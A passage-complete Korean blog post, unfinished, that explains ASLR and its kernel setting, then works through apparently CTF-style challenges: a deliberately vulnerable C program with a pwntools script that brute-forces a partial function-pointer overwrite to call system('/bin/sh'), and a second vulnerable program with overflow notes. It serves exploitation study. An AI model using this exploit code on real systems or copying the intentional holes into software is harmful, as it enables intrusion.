---
tistoryBlogName: k0n9
tistoryTitle: ASLR
tistoryVisibility: "3"
tistoryCategory: "1117646"
tistorySkipModal: true
tistoryPostId: "25"
tistoryPostUrl: https://k0n9.tistory.com/25
---
### ASLR이란?

주소 공간 배열 무작위화, 즉 실행할때마다 데이터 영역의 주소를 무작위화시켜서 직접적인 메모리 주소 참조가 힘들어진다. 

echo \[NUM] > /proc/sys/kernel/randomize_va_space 

num = 0 : aslr 해제 
num = 1 : 스택, 라이브러리 랜덤화 
num = 2 : 스택, 라이브러리, 힙 랜덤화

#### 예시
```C
#include <stdio.h>
#include <stdlib.h>
  
int main()
{
    int stack;
    int *heap = (int*)malloc(3);
    printf("stack address : %p\n", &stack);
    printf("printf address : %p\n", printf);
    printf("heap address  : %p\n", heap);
    return 0;
}
```

stack, heap, library 주소를 출력해주는 코드이다. 

![](https://i.imgur.com/13NqdyT.png)

![](https://i.imgur.com/YdUQfM8.png)

![](https://i.imgur.com/tmU9qhX.png)


### 예제 __ 1
```C
// gcc -o chall chall.c -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
  
typedef struct addr_t {
    size_t start_addr;
    size_t end_addr;
} addr_t;
  
addr_t* p = NULL;
size_t get_libc_code_addr() {
    FILE *fp;
    size_t start_addr;
    size_t end_addr;
    char buffer[256];
    char perm[5] = {0, };
  
    fp = fopen("/proc/self/maps", "r");
    if (fp == NULL) {
        perror("Open error");
        exit(-1);
    }
    p = malloc(sizeof(addr_t));
    if(!p) {
        perror("Malloc error");
        exit(-1);
    }
  
    while (1) {
        memset(perm, NULL, sizeof(perm));
        if(fscanf(fp, "%lx-%lx %4s", &start_addr, &end_addr, perm) == -1) {
            break;
        }
        fgets(buffer, 256, fp);
        if(strstr(perm, "x") && strstr(buffer, "libc.so.6")) {
            p->start_addr = start_addr;
            p->end_addr = end_addr;
            break;
        }
    }
}
  
int hint(void* num) {
    return 0;
}
  
int check_valid_addr(size_t addr) {
    return p->start_addr <= addr ? (p->end_addr >= addr ? 1 : 0) : 0;
}
  
void initialize() {
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
}
  
int main() {
    size_t num = 0;
    char name[0x10] = {0, };
    void (*func_ptr)(void) = NULL;
  
    initialize();
    get_libc_code_addr();
  
    printf("[+] What is your name?\n> ");
    read(0, name, sizeof(name)-1);
    printf("Hello %s\nI will give you gift\n> ");
  
    scanf("%llu", &num);
    func_ptr =  (num & 0xfffff) + (p->start_addr & 0xfffffffffff00000);
    if(!check_valid_addr(func_ptr)) {
        printf("Invalid addr");
        return 0;
    }
  
    hint(name);
    func_ptr();
  
    return 0;
}
```

우선 get_libc_code_addr()함수를 실행시킨다. 이 함수는 p->start_addr에 libc base를 저장하는 함수이다. 
다음 name을 입력받고 그다음 num을 입력받는다. 그리고 func_ptr 함수포인터에 (num & 0xfffff) + (p->start_addr & 0xfffffffffff00000) 를 저장하고 hint(name) 후 func_ptr 함수포인터를 실행한다. 우선 하위 5 니블은 내가 입력한 값이다. 그런데 그 나머지를 제외한 나머지는 libc base로 주어지기 때문에 우리는 하위 5니블만 맞추면 된다. 그런데 그중 하위 3니블은 offset으로 고정이다. 그러니 우리는 8비트 브루트 포싱을 하면 된다. 

그렇게 func_ptr에 system 주소를 넣을 수 있다. 인자는 어떻게 할까?
func_ptr() 전에 hint(name)을 실행한다. hint는 아무것도 하지 않는 함수이다. 그래서 name에 /bin/sh 문자열 주소를 넣어서 rdi 값을 조작할 수 있다.

```python
from pwn import *
  
 
context.log_level= 'debug'
  
i = 0
while True:
    logging.getLogger("pwnlib").setLevel(logging.ERROR)
  
    try:
        i += 1
        print(i)
        p = process("./chall")
        system_offset = 0x80d60
        # pause()
  
        p.sendafter(b"> ", str("/bin/sh"))
        p.sendlineafter(b"> ", str(system_offset))
  
        p.sendline('id')
        data=p.recv(100,timeout=0.1)
        if b'uid' in data:
            p.interactive()
        else:
            p.close()
    except EOFError:
        p.close()
        pass
```

![](https://i.imgur.com/WfKNRvB.png)


### 예제 __ 2
```C
#include <err.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stddef.h>
  
#define INSN_ENDBR64 (0xF30F1EFA) /* endbr64 */
#define CFI(f)                                               \
  ({                                                        \
    if (__builtin_bswap32(*(uint32_t*)(f)) != INSN_ENDBR64) \
      __builtin_trap();                                     \
    (f);                                                    \
  })// f를 받아서 INSN_ENDBR64와 비교하고 만약 다르다면 종료, 아니라면 f를 반환한다.
  
#define KEY_SIZE 0x20
typedef struct {              // 전체 크기 0x58
  char key[KEY_SIZE];         // 0x20
  char buf[KEY_SIZE];         // 0x20
  const char *error;          // 0x8
  int status;                // 0x8
  void (*throw)(int, const char*, ...);  // 0x8
} ctx_t;
  
void read_member(ctx_t *ctx, off_t offset, size_t size) {
  if (read(STDIN_FILENO, (void*)ctx + offset, size) <= 0) { //
    ctx->status = EXIT_FAILURE;   // 에러났을 경우
    ctx->error = "I/O Error";
  }
  ctx->buf[strcspn(ctx->buf, "\n")] = '\0'; //개행 문자 0으로 바꿈
  
  if (ctx->status != 0)
    CFI(ctx->throw)(ctx->status, ctx->error); // status와 error는 throw의 인자임
} //throw는 아마도 canary leak하는데 쓰이지 않을까?
  
void encrypt(ctx_t *ctx) {
  for (size_t i = 0; i < KEY_SIZE; i++)
    ctx->buf[i] ^= ctx->key[i];  // bit단위 xor
}
  
int main() {
  ctx_t ctx = { .error = NULL, .status = 0, .throw = err };
  
  read_member(&ctx, offsetof(ctx_t, key), sizeof(ctx));   // sizeof(ctx) = 0x58
  read_member(&ctx, offsetof(ctx_t, buf), sizeof(ctx));
                    // 아 이거 offsetof네, 위에꺼는 0, 아래꺼는 0x20, overflow 발생
  encrypt(&ctx);
  /*
  여기서
  ctx.buf는 libc가 있는 곳을 가리켜야 함
  */
  write(STDOUT_FILENO, ctx.buf, KEY_SIZE); // 여기서 libc_base leak하는 듯
  
  return 0;
}
```
일단 코드 분석은 했다. 나중에 해야지...

## 작성 중...
